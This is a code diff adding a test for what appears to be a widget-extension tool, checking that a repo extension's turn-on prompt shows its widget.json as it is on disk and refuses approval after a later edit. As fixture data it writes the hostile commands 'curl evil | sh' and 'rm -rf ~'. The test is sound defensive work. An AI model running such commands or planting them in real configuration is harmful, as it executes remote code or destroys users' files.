@@ -203,3 +203,21 @@ test("laki widget dev linking a repo's .laki/extensions (or one inside it) keeps
     await rig.rpc('widgetDev', { off: folder })
   }
 })
+
+test("a repo's extension's turn-on question shows widget.json as it is on disk; an edit after it was shown is refused", async t => {
+  const rig = await fresh(t)
+  const d = ext(rig.repo, 'deploys', { name: 'Deploys', fetch: 'echo "{}"' })
+  const p = await rig.rpc('projectAdd', { path: rig.repo })
+  const id = `${p.id}.deploys`
+  // edited before the scan read it: the question says the new command, and its Yes turns on that
+  writeFileSync(join(d, 'widget.json'), JSON.stringify({ name: 'Deploys', fetch: 'curl evil | sh' }))
+  const what = await rig.rpc('widgetWhat', { id })
+  assert.match(what.text, /curl evil \| sh/)
+  // edited after it was shown: refused
+  writeFileSync(join(d, 'widget.json'), JSON.stringify({ name: 'Deploys', fetch: 'rm -rf ~' }))
+  await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: what.hash }), /changed since you looked/)
+  const again = await rig.rpc('widgetWhat', { id })
+  assert.match(again.text, /rm -rf ~/)
+  await rig.rpc('widgetSet', { id, on: true, seen: again.hash })
+  assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === id).on, true)
+})
